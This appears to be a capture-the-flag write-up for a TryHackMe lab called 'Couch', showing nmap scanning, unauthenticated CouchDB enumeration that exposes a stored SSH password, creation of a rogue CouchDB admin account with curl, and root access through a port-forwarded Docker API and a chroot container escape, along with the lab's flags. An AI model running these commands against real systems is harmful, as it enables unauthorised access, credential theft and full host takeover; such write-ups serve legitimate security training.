> Couch

# Nmap

nmap -sC -sV -Pn -A -vv -p- -oN nmap/initial $IP

```bash
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
5984/tcp open  http    syn-ack CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-favicon: Unknown favicon MD5: 2AB2AAE806E8393B70970B2EAACE82E0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumerating CouchDB

curl http://$IP:5984

```json
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```

We can post a GET request to some endpoints and get results.

# Listing all DBs

```bash
curl -X GET http://$IP:5984/_all_dbs
```

```json
["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
```

What is this `secret` db? 

curl http://$IP:5984/secret 

**Investigating database**

```json
{"db_name":"secret","doc_count":1,"doc_del_count":0,"update_seq":2,"purge_seq":0,"compact_running":false,"disk_size":8287,"data_size":339,"instance_start_time":"1625314873403152","disk_format_version":6,"committed_update_seq":2}
```

**Document Listing**

```bash
curl -X GET http://$IP:5984/secret/_all_docs
```

```json
{"total_rows":1,"offset":0,"rows":[
{"id":"a1320dd69fb4570d0a3d26df4e000be7","key":"a1320dd69fb4570d0a3d26df4e000be7","value":{"rev":"2-57b28bd986d343cacd9cb3fca0b20c46"}}
]}
```

**Read Contents**

curl -X GET http://$IP:5984/secret/a1320dd69fb4570d0a3d26df4e000be7

```json
{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t4qfzcc4qN##"}
```

We got a password and I tried it for SSH! Wow! Yep! We are in as atena.

# user.txt

```
THM{1ns3cure_couchdb}
```

I actually created an admin in couchdb.

```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' $IP:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```

# Privilege Escalation

Running Linpeas I found .bash_hostiry file's content. 

```bash
nano root.txt
exit
sudo deluser USERNAME sudo
sudo deluser atena sudo
exit
sudo -s
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Looks like we have docker and a image named alpine. So I followed Hacktricks and got a payload.

```bash
docker run -it -v /:/host/ alpine chroot /host/ bash
docker: Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post http://%2Fvar%2Frun%2Fdocker.sock/v1.39/containers/create: dial unix /var/run/docker.sock: connect: permission denied.
See 'docker run --help'.
```

But permission denied. So let's port forward to our system.

ssh atena@$IP -L 2375:127.0.0.1:2375

Now we can access docker in our localhost:2375.

```bash
export DOCKER_HOST="tcp://127.0.0.1:2375"
docker run -it -v /:/host/ alpine chroot /host/ bash
```

And we are root!

# root.txt

```
THM{RCE_us1ng_Docker_API}
```